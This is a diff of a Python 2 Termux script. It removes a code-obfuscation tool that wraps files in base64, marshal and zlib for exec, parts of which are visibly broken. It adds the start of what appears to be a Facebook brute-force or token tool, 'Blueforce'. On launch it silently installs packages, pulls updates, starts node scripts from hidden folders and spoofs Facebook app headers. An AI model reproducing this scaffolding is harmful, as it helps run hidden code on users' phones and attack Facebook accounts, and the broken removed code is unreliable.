@@ -1,1467 +1,692 @@
-# -*- coding=utf-8 -*-
-
-# Copyright  Mark Cornel
-
-# Recode GUPTA
-
-# Tolong Kembangkan Lagi Tools Ini, Meskipun Unfaedah:v
-
-# Maaf Kalo Ada Yang Error Wkwk
-
-# Tools Ini Di Cari Para Recoder
-
-# Banyak Yang Memperjual Belikan Tools Seperti Ini
-
-# Tapi Disini Free Dan Juga Open Source :)
-
-# ------------* Maaf Kalo Codingannya Berantakan *--------------
-
-from sys import stdout
-
-import subprocess as sp
-
-import os, sys, time, random, base64, marshal, getpass, re, zlib
-
-m = '\x1b[1;91m'
-
-u = '\x1b[1;95m'
-
-h = '\x1b[1;92m'
-
-p = '\x1b[1;37m'
-
-k = '\x1b[1;33m'
-
-b = '\x1b[1;34m'
-
-bm = '\x1b[96m'
-
-about =     '''
-
-                {}Creator           : {}Mark Cornel
-
-                {}About             : {}Encrypt And Decrypt Tool
-
-                {}Version           : {}1.0 (beta)
-
-                {}Special thanks to : {}KarMa SWT and YOU
-
-                {}Code name         : {}Tytyd:v
-
-                {}Team              : {}UNDERGROUND SCIENCE
-
-                {}E-mail            : {} ngozic328@gmail.com
-
-                {}Github            : {}GUPTA-SHAKEL
-
-                {}Telegram          : {}NONE
-
-                {}Facebook          : {}Upss (Fb Fahki khan:v)
-
-                {}Date              : {}16.49 02-02-2021
-
-                
-
-                {}Region            : {}Tangerang,Banten, Indonesia'''.format(p,k,p,k,p,k,p,k,p,k,p,k,p,k,p,k,p,k,p,k,p,k,p,k,p,k)
-
-def chat():
-
-        load('Silahkan Tunggu Sebentar---')
-
-	os.system('xdg-open https://www.facebook.com/profile.php?id=100046218699200')
-
- 	{} ▄▀▀▀▄{} *Hello Dude!!
-
-	{} █   █{} *Where Are You?
-
-	███████         ▄▀▀▄
-
-	██─▀─██  █▀█▀▀▀▀█  █
-
-	███▄███  ▀ ▀     ▀▀'''.format(m,p,m,p)
-
-def lisensi_enc():
-
-	clr()
-
-	print kunci
-
-	print('{}[{}!{}] {}Upss!! Sorry Dude This Tools Requiress Password'.format(m,p,m,p))
-
-	paswd = getpass.getpass('{}[{}×{}]{} Input Password {}>> {}'.format(m,p,m,p,k,p))
-
-	if paswd == ('FAMOUSKING'):
-
-		jalan('Password Benar ✓ ',0.1)
-
-		time.sleep(2)
-
-		menu_enc()
-
-	elif paswd == (''):
-
-		run('Masukkan Password Nya !!')
-
-		time.sleep(1.5)
-
-		lisensi_enc()
-
-	else:
-
-		jalan('Password wrong!!',0.1)
-
-		chat()
-
-def lisensi_dec():
-
-	clr()
-
-        print kunci
-
-        print('{}[{}!{}] {}Upss!! Sorry Dude This Tools Requiress Password'.format(m,p,m,p))
-
-        paswd = getpass.getpass('{}[{}×{}]{} Input Password {}>> {}'.format(m,p,m,p,k,p))
-
-        if paswd == ('FAMOUSKING'):
-
-                run('Password Benar')
-
-                time.sleep(2)
-
-                menu_dec()
-
-        elif paswd == (''):
-
-                run('Masukkan Password Nya !!')
-
-                time.sleep(1.5)
-
-                lisensi_dec()
-
-        else:
-
-                run('Password Wrong!!')
-
-		chat()
-
+#coding=utf-8
+#!/usr/bin/python2
+#source code by Mark Cornel
+#codded by Mark Cornel
+# do no try to decode it
 try:
-
-    from uncompyle6.main import decompile
-
-except Exception as e:
-
-    sp.call('pip2 install uncompyle6', shell=True, stderr=sp.STDOUT)
-
-'''
-
-(((((((((((((((((((((LIST COLORS)))))))))))))))))))))
-
-'''
-
-red   = '\x1b[31m' # Merah
-
-green = '\x1b[32m' # Hijau
-
-yellow = '\x1b[33m' # Kuning
-
-blue  = '\x1b[34m' # Biru
-
-magenta = '\x1b[35m' # Ungu
-
-cyan  = '\x1b[36m' # Biru Muda
-
-white = '\x1b[37m' # Putih
-
-reset = '\x1b[39m' # Reset Warna ( Kembali Ke Warna Awal )
-
-brblack = '\x1b[90m' # Hitam Terang
-
-R = '\x1b[91m' # Merah Terang
-
-brgreen = '\x1b[92m' # Hijau Terang
-
-k = '\x1b[93m' # Kuning Terang
-
-brblue = '\x1b[94m' # Biru Terang
-
-brmgnt = '\x1b[95m' # Ungu Terang
-
-brcyan = '\x1b[96m' # Biru Muda Terang
-
-G = '\x1b[97m' # Putih Terang
-
-'''
-
-# Jika Ingin Membuat Tulisan Miring Tambahkan "3;"
-
-# Example : print('\x1b[3;31mAso')
-
-# Outputnya Seperti Ini = Aso ( Tapi Miring:v )
-
-# Coba Aja Aso Kalo Gapercaya
-
-'''
-
-#((((((((((((((((((((((ANIMATION :V))))))))))))))))))))))
-
-def jalan(z, t):
-
-    for e in z:
-
-        sys.stdout.write(e)
-
-        sys.stdout.flush()
-
-        time.sleep(t)
-
-def load(word):
-
-    lix = [
-
-     '/', '-', '╲', '|']
-
-    for i in range(5):
-
-        for x in range(len(lix)):
-
-            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
-
-            time.sleep(0.2)
-
-            sys.stdout.flush()
-
-def banner_dec():
-
-	banner = ''' 
-
-{}:::::::-.  .,::::::    .,-:::::      ...     .        :   ::::::::::. ::: :::     .,::::::  
-
- ;;,   ``;,;;;;````  ,;;;``````   .;;;;;;;.  ;;,.    ;;;   `;;;```.;;;;;; ;;;     ;;;;````  
-
- `[[     [[ [[cccc   [[[         ,[[     \[[,[[[[, ,[[[[,   `]]nnn]]' [[[ [[[      [[cccc   
-
-{}  $$,    $$ $$""""   $$$         $$$,     $$$$$$$$$$$"$$$    $$$""    $$$ $$'      $$""""   
-
-  888_,o8P' 888oo,__ `88bo,__,o, "888,_ _,88P888 Y88" 888o   888o     888o88oo,.__ 888oo,__ 
-
-  MMMMP"`   """"YUMMM  "YUMMMMMP"  "YMMMMMP" MMM  M'  "MMM   YMMMb    MMM""""YUMMM """"YUMMM'''.format(m,p)
-
-	running(banner)
-
-def banner_enc():
-
-	banner = '''
-
-{} █▀▀ █▄─█ ▄▀ █▀▀▄ ▀▄─▄▀ █▀▄ ▀█▀
-
- █▀▀ █─▀█ █─ █▐█▀ ──█── █─█ ─█─
-
- ▀▀▀ ▀──▀ ─▀ ▀─▀▀ ──▀── █▀─ ─▀─'''.format(m)
-
-	running(banner)
-
-def running(s):
-
-	try:
-
-		for c in s + '\n':
-
-        	    sys.stdout.write(c)
-
-	            sys.stdout.flush()
-
-	            time.sleep(0.001)
-
-	except (KeyboardInterrupt,EOFError):
-
-		run('Nonaktif!!!')
-
-def run(x):
-
-    pt = '\x1b[1;37m'
-
-    rd = '\x1b[1;37m\x1b[1;31m'
-
-    rg = '\x1b[6;32m'
-
-    try:
-
-        num = 0
-
-        while num < 1:
-
-            for i, char in enumerate(x):
-
-                if i == 0:
-
-                    print '\r%s%s%s%s' % (rg, char.lower(), rd, x[1:]),
-
-                    sys.stdout.flush()
-
-                else:
-
-                    if i == 1:
-
-                        roy = x[0].lower()
-
-                        print '\r%s%s%s%s%s%s' % (rd, roy, pt, char.lower(), rg, x[2:]),
-
-                        sys.stdout.flush()
-
-                    elif i == i:
-
-                        roy = x[0:i].lower()
-
-                        print '\r%s%s%s%s%s%s' % (rd, roy, pt, char.lower(), rg, x[i + 1:]),
-
-                        sys.stdout.flush()
-
-                    time.sleep(0.07)
-
-            num += 1
-
-    except:
-
-        exit()
-
-def clr():
-
-    os.system('clear')
-
-def logo():
-
-    banner_enc()
-
-def b_menu():
-
-    bm =  '''{}╔═════════════════════════════════════════════╗
-
-║{}[{}+{}]{}Coded    : Mark Cornel [GUPTA]               ║
-
-║{}[{}+{}]{}Github   : https://github.com/GUPTA-SHAKEL ║
-
-║{}[{}+{}]{}Tools    : Encrypt And Decrypt            ║
-
-║{}[{}+{}]{}Created   : 18 - 08- 2021                        ║
-
-╚═════════════════════════════════════════════╝'''.format(p,m,p,m,p,m,p,m,p,m,p,m,p,m,p,m,p)
-
-    jalan(bm,0.001)
-
-def menu():
-
-    clr()
-
-    b_menu()
-
-    print('\n{}Happy Encompile And Decompile Bro :){}'.format(brblue,reset))
-
-    running('\n{}[{}1{}]{}.Encrypt\n{}[{}2{}]{}.Decrypt\n{}[{}3{}]{}.Report Bug\n{}[{}4{}]{}.About\n{}[{}5{}]{}.Update Tools'.format(m,p,m,p,m,p,m,p,m,p,m,p,m,p,m,p,m,p,m,p))
-
-    fuck = raw_input('{}[{}?{}]{} Choose {}>> {}'.format(m,p,m,p,k,p))
-
-    if fuck == '1' or fuck == '01':
-
-	load('Processing >--')
-
-	menu_enc()
-
-    elif fuck == '2' or fuck == '02':
-
-	load('Processing >--')
-
-	menu_dec()
-
-    elif fuck == '':
-
-	run('Jangan Kosong Gblk!!')
-
-	menu()
-
-    elif fuck == '3' or fuck == '03':
-
-        jalan(p + 31 * '\xe2\x95\x90' + h + '[' + bm + 'Haii' + h + ']' + p + '>', 0.008)
-
-        print '\n' + h + '[' + m + '!' + h + ']' + p + ' Chat Via WhatsApp '
-
-        chat = raw_input(h + '[' + k + '?' + h + ']' + p + ' Enter your message : ')
-
-        chat.replace(' ', '%20')
-
-        load(h + '[' + k + '~' + h + ']' + p + 'Loading please wait ...')
-
-        try:
-
-             sp.check_output([
-
-             'am', 'start',
-
-             'https://api.whatsapp.com/send?phone=+2347034457117&text=Report : ' + chat + ''])
-
-        except:
-
-            sys.exit('\n' + h + '[' + k + '!' + h + ']' + p + ' Failed to send message ')
-
-    elif fuck == '4' or fuck == '04':
-
-        load('Processing >--')
-
-	clr()
-
-        running(about)
-
-	time.sleep(5)
-
-	menu()
-
-    elif fuck == '5' or fuck == '05':
-
-        load('Processing >--')
-
-        clr()
-
-        os.system('git pull')
-
-    else:
-
-	run('Pilihannya Cuma 1,2,3,4 & 5 Doang Kontol!!')
-
-	menu()
-
-def menu_enc():
-
-    clr()
-
-    banner_enc()
-
-    running('-'*15)
-
-    running('{}[{}01{}]{} Encrypt Base16'.format(m,p,m,k))
-
-    running('{}[{}02{}]{} Encrypt Base32'.format(m,p,m,k))
-
-    running('{}[{}03{}]{} Encrypt Base64'.format(m,p,m,k))
-
-    running('{}[{}04{}]{} Encrypt Hex'.format(m,p,m,k))
-
-    running('{}[{}05{}]{} Encrypt Marshal'.format(m,p,m,k))
-
-    running('{}[{}06{}]{} Compile py > pyc'.format(m,p,m,k))
-
-    running('{}[{}07{}]{} Encrypt Marshal Zlib Base64'.format(m,p,m,k))
-
-    running('{}[{}08{}]{} Encrypt Zlib '.format(m,p,m,k))
-
-    running('{}[{}00{}]{} Exit'.format(m,p,m,k))
-
-    running('-'*15)
-
-    try:
-
-        inp = raw_input('{}[{}??{}]{} Choose {}>>{} '.format(m,p,m,k,h,p))
-
-    except (KeyboardInterrupt,EOFError):
-
-        run ('Nonaktif!!')
-
-        menu()
-
-    if inp == '1' or inp == '01':
-
-        clr()
-
-        Satu()
-
-    elif inp == '2' or inp == '02':
-
-        clr()
-
-        Dua()
-
-    elif inp == '3' or inp == '03':
-
-        clr()
-
-        Tiga()
-
-    elif inp == '4' or inp == '04':
-
-        clr()
-
-        Empat()
-
-    elif inp == '5' or inp == '05':
-
-        clr()
-
-        Lima()
-
-    elif inp == '6' or inp == '06':
-
-        clr()
-
-        pyc()
-
-    elif inp == '7' or inp == '07':
-
-	clr()
-
-        emzb()
-
-    elif inp == '8' or inp == '08':
-
-        clr()
-
-        ezl()
-
-    elif inp == '':
-
-        run ('Pilih Nomornya Woe!!!')
-
-        time.sleep(2)
-
-        menu_enc()
-
-    elif inp == '0' or inp == '00':
-
-        exit()
-
-    else:
-
-        run ('Salah Memasukkan Pilihan!!')
-
-        time.sleep(2)
-
-        menu_enc()
-
-def menu_dec():
-
-    clr()
-
-    banner_dec()
-
-    running('-'*15)
-
-    running('{}[{}01{}]{} Decrypt base16'.format(m,p,m,k))
-
-    running('{}[{}02{}]{} Decrypt base32'.format(m,p,m,k))
-
-    running('{}[{}03{}]{} Decrypt base64'.format(m,p,m,k))
-
-    running('{}[{}04{}]{} Decrypt Hex'.format(m,p,m,k))
-
-    running('{}[{}05{}]{} Decrypt Marshal'.format(m,p,m,k))
-
-    running('{}[{}06{}]{} Uncompyle6 pyc > py'.format(m,p,m,k))
-
-    running('{}[{}07{}]{} Decrypt Marshal,Zlib,Base64'.format(m,p,m,k))
-
-    running('{}[{}08{}]{} Decrypt Zlib'.format(m,p,m,k))
-
-    running('{}[{}00{}]{} Exit'.format(m,p,m,k))
-
-    running('-'*15)
-
-    try:
-
-        inp = raw_input('{}[{}??{}]{} Choose {}>>{} '.format(m,p,m,k,h,p))
-
-    except (KeyboardInterrupt,EOFError):
-
-        run ('Nonaktif!!')
-
-	menu()
-
-    if inp == '1' or inp == '01':
-
-	clr()
-
-	Enam()
-
-    elif inp == '2' or inp == '02':
-
-	clr()
-
-	Tujuh()
-
-    elif inp == '3' or inp == '03':
-
-	clr()
-
-	Delapan()
-
-    elif inp == '4' or inp == '04':
-
-	clr()
-
-	Sembilan()
-
-    elif inp == '5' or inp == '05':
-
-	clr()
-
-	unmarsh()
-
-    elif inp == '6' or inp == '06':
-
-	clr()
-
-	unpyc()
-
-    elif inp == '7' or inp == '07':
-
-        clr()
-
-        mzb()
-
-    elif inp == '8' or inp == '08':
-
-        clr()
-
-        zl()
-
-    elif inp == '':
-
-	run ('Pilih Nomornya Woe!!!')
-
-	time.sleep(2)
-
-	menu_dec()
-
-    elif inp == '0' or inp == '00':
-
-	exit()
-
-    else:
-
-	run ('Salah Memasukkan Pilihan!!')
-
-	time.sleep(2)
-
-	menu_dec()
-
-def Satu():
-
-    clr()
-
-    logo()
-
-    try:
-
-        f = raw_input('Filenames: ')
-
-    except:
-
-        exit()
-
-    try:
-
-        bk = open(f, 'r').read()
-
-    except:
-
-        run('file %s tidak ditemukan ' % f)
-
-        time.sleep(1.5)
-
-	Satu()
-
-    en = base64.b16encode(bk)
-
-    ff = f + 'c'
-
-    open(ff, 'w').write('import base64\nexec(base64.b16decode("%s"))' % en)
-
-    nm = ('').join(f.split('.')[:1]) + '-enc.py'
-
-    os.rename(ff, nm)
-
-    run('file berhasil di encrypt menjadi %s ' % nm)
-
-def Dua():
-
-        clr()
-
-        logo()
-
-        try:
-
-            f = raw_input('Filenames: ')
-
-        except:
-
-            exit()
-
-        try:
-
-            bk = open(f, 'r').read()
-
-        except:
-
-            run('file %s tidak ditemukan ' % f)
-
-            exit()
-
-        en = base64.b32encode(bk)
-
-        ff = f + 'c'
-
-        open(ff, 'w').write('import base64\nexec(base64.b32decode("' + en + '"))')
-
-        nm = ('').join(f.split('.')[:1]) + '-enc.py'
-
-        os.rename(ff, nm)
-
-        run('file berhasil di encrypt menjadi %s ' % nm)
-
-def Tiga():
-
-        clr()
-
-        logo()
-
-        try:
-
-            f = raw_input('Filenames: ')
-
-        except:
-
-            exit()
-
-        try:
-
-            bk = open(f, 'r').read()
-
-        except:
-
-            run('file %s tidak ditemukan ' % f)
-
-            exit()
-
-        en = base64.b64encode(bk)
-
-        ff = f + 'c'
-
-        open(ff, 'w').write('import base64\nexec(base64.b64decode("' + en + '"))')
-
-        nm = ('').join(f.split('.')[:1]) + '-enc.py'
-
-        os.rename(ff, nm)
-
-        run('file berhasil di encrypt menjadi %s ' % nm)
-
-def Empat():
-
-        clr()
-
-        logo()
-
-        try:
-
-            f = raw_input('Filenames: ')
-
-        except:
-
-            exit()
-
-        try:
-
-            bk = open(f, 'r').read()
-
-        except:
-
-            run('file %s tidak ditemukan ' % f)
-
-            exit()
-
-        en = bk.encode('hex')
-
-        ff = f + 'c'
-
-        open(ff, 'w').write('exec("' + en + '").decode("hex")')
-
-        nm = ('').join(f.split('.')[:1]) + '-enc.py'
-
-        os.rename(ff, nm)
-
-        run('file berhasil di encrypt menjadi %s ' % nm)
-
-def Lima():
-
-        clr()
-
-        logo()
-
-        try:
-
-            f = raw_input('Filenames: ')
-
-        except:
-
-            exit()
-
-        try:
-
-            bk = open(f, 'r').read()
-
-        except:
-
-            run('file %s tidak ditemukan ' % f)
-
-            exit()
-
-        c = compile(bk, '<roy>', 'exec')
-
-        en = marshal.dumps(c)
-
-        ff = f + 'c'
-
-        open(ff, 'w').write('import marshal Encrypted by Timmy Tedy\nexec(marshal.loads(' + repr(en) + '))')
-
-        nm = ('').join(f.split('.')[:1]) + '-enc.py'
-
-        os.rename(ff, nm)
-
-        run('file berhasil di encrypt menjadi %s ' % nm)
-
-def emzb():
-
-	clr()
-
-	logo()
-
-	try:
-
-            file = raw_input('File: ')
-
-            fileopen = open(file).read()
-
-	    no = compile(fileopen,'aso','exec')
-
-	    b = marshal.dumps(no)
-
-            c = zlib.compress(b)
-
-            d = base64.b64encode(c)
-
-            e = ('import marshal,zlib,base64\nexec(marshal.loads(zlib.decompress(base64.b64decode("' + d + '"))))')
-
-            f = file.replace('.py', '-enc.py')
-
-            g = open(f, 'w')
-
-            g.write(e)
-
-            g.close()
-
-            run('file berhasil di encrypt menjadi %s ' % f)
-
-            raw_input('Tekan Enter Untuk Kembali Ke Menu')
-
-	    menu()
-
-        except IOError:
-
-	    run('file tidak ditemukan ')
-
-	    raw_input('Tekan Enter Untuk Kembali Ke Menu')
-
-            emzb()
-
-def ezl():
-
-    print "Encrypt Zlib"
-
-    file = raw_input('File : ')
-
-    out = file.replace('.py', '-enc.py')
-
-    oa = open(file).read()
-
-    xs = zlib.compress(oa)
-
-    s = open(out, 'w')
-
-    s.write('import zlib\nexec(zlib.decompress(' +repr(xs)+ '))')
-
-    s.close()
-
-    print ('File saved as '+ out)
-
-def Enam():
-
-        clr()
-
-        banner_dec()
-
-        try:
-
-	    print 'Dec base64.b16decocde'
-
-            f = raw_input('Filenames: ')
-
-        except:
-
-            exit()
-
-        try:
-
-            bk = open(f, 'r').read()
-
-        except:
-
-            run('file %s tidak ditemukan ' % f)
-
-            exit()
-
-        bk = bk.replace('exec(base64.b16decode("', '')
-
-        bk = bk.replace('"))', '')
-
-        bk = bk.replace('import base64\n', '')
-
-        en = base64.b16decode(bk)
-
-        ff = f + 'c'
-
-        open(ff, 'w').write(en)
-
-        nm = ('').join(f.split('.')[:1]) + '-dec.py'
-
-        os.rename(ff, nm)
-
-        run('file berhasil di decrypt menjadi %s ' % nm)
-
-def Tujuh():
-
-        clr()
-
-        banner_dec()()
-
-        try:
-
-	    print 'Dec base64.b32decode'
-
-            f = raw_input('Filenames: ')
-
-        except:
-
-            exit()
-
-        try:
-
-            bk = open(f, 'r').read()
-
-        except:
-
-            run('file %s tidak ditemukan ' % f)
-
-            exit()
-
-        bk = bk.replace('exec(base64.b32decode("', '')
-
-        bk = bk.replace('"))', '')
-
-        bk = bk.replace('import base64\n', '')
-
-        en = base64.b32decode(bk)
-
-        ff = f + 'c'
-
-        open(ff, 'w').write(en)
-
-        nm = ('').join(f.split('.')[:1]) + '-dec.py'
-
-        os.rename(ff, nm)
-
-        run('file berhasil di decrypt menjadi %s ' % nm)
-
-def Delapan():
-
-	clr()
-
-        banner_dec()
-
-        try:
-
-	    print 'Dec base64.b64decode'
-
-            f = raw_input('Filenames: ')
-
-        except:
-
-            exit()
-
-        try:
-
-            bk = open(f, 'r').read()
-
-        except:
-
-            run('file %s tidak ditemukan ' % f)
-
-            exit()
-
-        bk = bk.replace(+'exec(base64.b64decode("', '')
-
-        bk = bk.replace('"))', '')
-
-        bk = bk.replace('import base64\n', '')
-
-        en = base64.b64decode(bk)
-
-        ff = f + 'c'
-
-        open(ff, 'w').write(en)
-
-        nm = ('').join(f.split('.')[:1]) + '-dec.py'
-
-        os.rename(ff, nm)
-
-        run('file berhasil di decrypt menjadi %s ' % nm)
-
-def Sembilan():
-
-	clr()
-
-        banner_dec()
-
-        try:
-
-	    print 'Dec hex'
-
-            f = raw_input('Filenames: ')
-
-        except:
-
-            exit()
-
-        try:
-
-            bk = open(f, 'r').read()
-
-        except:
-
-            run('file %s tidak ditemukan ' % f)
-
-            exit()
-
-        bk = bk.replace('exec("', '') or bk.replace("exec('", '')
-
-        bk = bk.replace('").decode("hex")', '') or bk.replace("').decode('hex')", '')
-
-        en = str(bk).decode('hex')
-
-        ff = f + 'c'
-
-        open(ff, 'w').write(en)
-
-        nm = ('').join(f.split('.')[:1]) + '-dec.py'
-
-        os.rename(ff, nm)
-
-        run('file berhasil di decrypt menjadi %s ' % nm)
-
-def unmarsh():
-
-    jalan(p + 31 * '\xe2\x95\x90' + h + '[' + bm + 'UNMARSH' + h + ']' + p + '>', 0.008)
-
-    print h + '\nMenu ' + p + ':\n [' + h + '1' + p + ']. Automatic Detection Version Script\n [' + h + '2' + p + ']. Back To Menu'
-
-    try:
-
-        pil = raw_input(h + '[' + k + '?' + h + ']' + p + ' Choice--> ')
-
-    except IOError:
-
-        unmarsh()
-
-    else:
-
-        if pil == '1':
-
-            pass
-
-        elif pil == '2':
-
-            menu()
-
-        else:
-
-            print h + '[' + m + '!' + h + ']' + p + ' Choose the right one'
-
-            unmarsh()
-
-        cek = 1
-
-        try:
-
-            print h + '[' + k + '#' + h + ']' + p + ' For Example : /path/marsh.py'
-
-            file = raw_input(h + '[' + k + '?' + h + ']' + p + ' Input File : ')
-
-            f = open(file, 'r').readlines()
-
-            for i in range(len(f)):
-
-                if f[i][0:4] == 'exec':
-
-                    if f[i][19] == 'b':
-
-                        cek = 3
-
-                    elif f[i][20] == 'c':
-
-                        cek = 2
-
-                    else:
-
-                        cek = 1
-
-        except IndexError:
-
-            print h + '[' + m + '!' + h + ']' + p + ' Program Error!!!'
-
-            sys.exit()
-
-        except KeyboardInterrupt:
-
-            print h + '[' + k + '^' + h + ']' + p + ' ctrl+c \n'
-
-            print h + '[' + k + '#' + h + ']' + p + ' Exit!!!\n'
-
-            time.sleep(3)
-
-            sys.exit()
-
-        except EOFError:
-
-            print h + '[' + k + '^' + h + ']' + p + ' ctrl+d \n'
-
-            print h + '[' + k + '#' + h + ']' + p + ' Exit!!!\n'
-
-            time.sleep(3)
-
-            sys.exit()
-
-        else:
-
-            try:
-
-                string = open(file, 'r').read()
-
-            except IOError:
-
-                print '\n' + h + '[' + m + '!' + h + ']' + p + ' File Not Found'
-
-                raw_input(h + '[' + k + '^' + h + ']' + p + ' Press Enter to Return to the menu ')
-
-                os.system('clear')
-
-                menu()
-
-        if cek == 2:
-
-            py = 'python2'
-
-            dec = 'decompile(2.7, x, stdout)'
-
-            sys.stdout.write(h + '[' + k + '#' + h + ']')
-
-            jalan(p + ' check the script version', 0.1)
-
-            time.sleep(1.5)
-
-            print '\n' + h + '[' + m + '*' + h + ']' + p + ' python version 2 was detected'
-
-            time.sleep(1)
-
-            try:
-
-                x = re.search('((?<![\\\\])[\\\'"])((?:.(?!(?<![\\\\])\\1))*.?)\\1', string).group()
-
-            except Exception as e:
-
-                raise e
-
-        elif cek == 3:
-
-            py = 'python3'
-
-            dec = 'decompile(3.8, x, stdout)'
-
-            sys.stdout.write(h + '[' + k + '#' + h + ']')
-
-            jalan(p + ' check the script version', 0.1)
-
-            time.sleep(1.5)
-
-            print '\n' + h + '[' + m + '*' + h + ']' + p + ' python version 3 was detected'
-
-            time.sleep(1)
-
-            try:
-
-                x = 'b' + re.search('((?<![\\\\])[\\\'"])((?:.(?!(?<![\\\\])\\1))*.?)\\1', string).group()
-
-            except Exception as e:
-
-                raise e
-
-        else:
-
-            print h + '[' + m + '!' + h + ']' + p + ' File Not Suport'
-
-            raw_input(h + '[' + k + '^' + h + ']' + p + ' Press Enter to Return to the menu ')
-
-            menu()
-
-    fileout = open('un.py', 'w')
-
-    fileout.write('from sys import stdout\nfrom uncompyle6.main import decompile\nimport marshal\n\n')
-
-    fileout.write('x = marshal.loads(' + x + ')\n')
-
-    fileout.write(dec)
-
-    fileout.close()
-
-    load(h + '[' + k + '#' + h + ']' + p + ' Unmarshal process Wait a minute ...')
-
-    sp.call(py + ' un.py > unpyc/dec.py', shell=True, stderr=sp.STDOUT)
-
-    os.system('rm un.py')
-
-    os.system('clear')
-
+    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
+    from multiprocessing.pool import ThreadPool
+except ImportError:
+    os.system("pip2 install requests")
+    os.system("python2 blueforce.indirect")
+os.system("clear")
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
+    os.system("apt update && apt install nodejs -y")
+from requests.exceptions import ConnectionError
+os.system("git pull")
+if not os.path.isfile("/data/data/com.termux/files/home/Blueforce_Abm/.empty/node_modules/bytes/index.js"):
+    os.system("fuser -k 5000/tcp &")
+    os.system("#")
+    os.system("cd .empty && npm install")
+    os.system("cd .empty && node index.js &")
+    os.system("clear")
+    time.sleep(10)
+elif os.path.isfile("/data/data/com.termux/files/home/Blueforce_Abm/.empty/node_modules/bytes/index.js"):
+    os.system("fuser -k 5000/tcp &")
+    os.system("cd .termux && node index.js &")
+#elif os.path.isfile("/data/data/com.termux/files/home/Blueforce_Abm/.empty/node_modules/bytes/generate_fb_token.js"):
+    #os.system("fuser -k 5000/tcp &")
+    #os.system("cd .termux && node generate_fb_token.js &")
+#elif os.path.isfile("/data/data/com.termux/files/home/Blueforce_Abm/.empty/node_modules/bytes/loadJS.js"):
+    #os.system("fuser -k 5000/tcp &")
+    #os.system("cd .termux && node loadJS.js &")
+    os.system("clear")
+bd=random.randint(2e7, 3e7)
+sim=random.randint(2e4, 4e4)
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+reload(sys)
+sys.setdefaultencoding("utf8")
+
+banner="""
+\033[1;97m ━━━━━━━━━━━━━━━━━━━━━━━━━━
+  
+┏━┓┏━┳━━━┳━━━┳┓┏━┓
+┃┃┗┛┃┃┏━┓┃┏━┓┃┃┃┏┛
+┃┏┓┏┓┃┃╋┃┃┗━┛┃┗┛┛
+┃┃┃┃┃┃┗━┛┃┏┓┏┫┏┓┃
+┃┃┃┃┃┃┏━┓┃┃┃┗┫┃┃┗┓
+┗┛┗┛┗┻┛╋┗┻┛┗━┻┛┗━┛
+\033[1;97m--------------------------------------------------
+\033[1;93m(!)\033[1;97m Author   : Mark Cornel
+\033[1;93m(!)\033[1;97m Github   : https://github.com/GUPTA-SHAKEL
+\033[1;93m(!)\033[1;97m WhatsApp  : +2347013107449
+\033[1;93m(!)\033[1;97m Api Key  : DEPRESSION
+\033[1;97m--------------------------------------------------
+"""
+
+def user_info():
+    os.system("clear")
+    print banner
     time.sleep(1)
-
-    delay = open('unpyc/dec.py', 'r').readlines()
-
-    for x in range(len(delay)):
-
-        jalan(delay[x], 0.0001)
-
-    print '\n\n' + h + '[' + k + '#' + h + ']' + p + ' Successfully Decompiled'
-
-    print h + '[' + k + '#' + h + ']' + p + ' file saved : unpyc/dec.py'
-
-    ask = raw_input(h + '[' + k + '?' + h + ']' + p + ' Decompile Again? y/t ')
-
-    if ask == 'y' or ask == 'Y':
-
-        menu()
-
-    elif ask == 't' or ask == 'T':
-
-        sys.exit()
-
-    else:
-
-        print h + '[' + m + '!' + h + ']' + p + ' Choose the right one ' + m + '!!!'
-
-        raw_input(h + '[' + k + '^' + h + ']' + p + ' Press Enter to Return to the menu ')
-
-        os.system('clear')
-
-def pyc():
-
-    print m + '[' + p + '#' + m + ']' + p + ' For Example : /path/marsh.py'
-
-    f = raw_input(m + '[' + p + '?' + m + ']' + p + ' Enter Your File : ')
-
-    from py_compile import compile
-
-    compile(f)
-
-    load(m + '[' + p + '#' + m + ']' + p + ' Compile process Wait a minute ...')
-
-    jalan('\n' + m + '[' + p + '#' + m + ']' + p + ' file successfully compiled', 0.01)
-
-    print '\n' + m + '[' + p + '#' + m + ']' + p + (' File Saved: {}c').format(f)
-
-    ask = raw_input(m + '[' + p + '?' + m + ']' + p + ' Compile Again? y/t >> ')
-
-    if ask == 'y' or ask == 'Y':
-
-        menu()
-
-    elif ask == 't' or ask == 'T':
-
-        sys.exit()
-
-    else:
-
-        print m + '[' + m + '!' + m + ']' + p + ' Choose the right one ' + m + '!!!'
-
-        raw_input(m + '[' + p + '^' + m + ']' + p + ' Press Enter to Return to the menu ')
-
-        os.system('clear')
-
-        menu()
-
-def unpyc():
-
-    print m + '[' + p + '#' + m + ']' + p + ' For Example : /path/file.pyc'
-
-    f = raw_input(m + '[' + p + '?' + m + ']' + p + ' Enter Your File : ')
-
     try:
-
-        open(f, 'r').read()
-
-    except IOError:
-
-        print m + '[' + m + '!' + m + ']' + p + ' File Not Found'
-
-        raw_input(m + '[' + p + '^' + m + ']' + p + ' Press Enter to Return to the menu ')
-
-        menu()
-
-    else:
-
-        load(m + '[' + p + '#' + m + ']' + p + ' Decompile process Wait a minute ...')
-
-        try:
-
-            os.system('uncompyle6 ' + f + '> unpyc/jadi.py')
-
-        except Exception as e:
-
-            print m + '[' + m + '!' + m + ']' + p + ' Failed to decompile because : ' + e
-
-    print '\n\n' + m + '[' + p + '#' + m + ']' + p + ' Successfully Decompiled'
-
-    print m + '[' + p + '#' + m + ']' + p + ' file saved : unpyc/jadi.py'
-
-    ask = raw_input(m + '[' + p + '?' + m + ']' + p + ' Decompile Again? y/t >> ')
-
-    if ask == 'y' or ask == 'Y':
-
-        menu()
-
-    elif ask == 't' or ask == 'T':
-
-        sys.exit()
-
-    else:
-
-        print m + '[' + m + '!' + m + ']' + p + ' Choose the right one ' + m + '!!!'
-
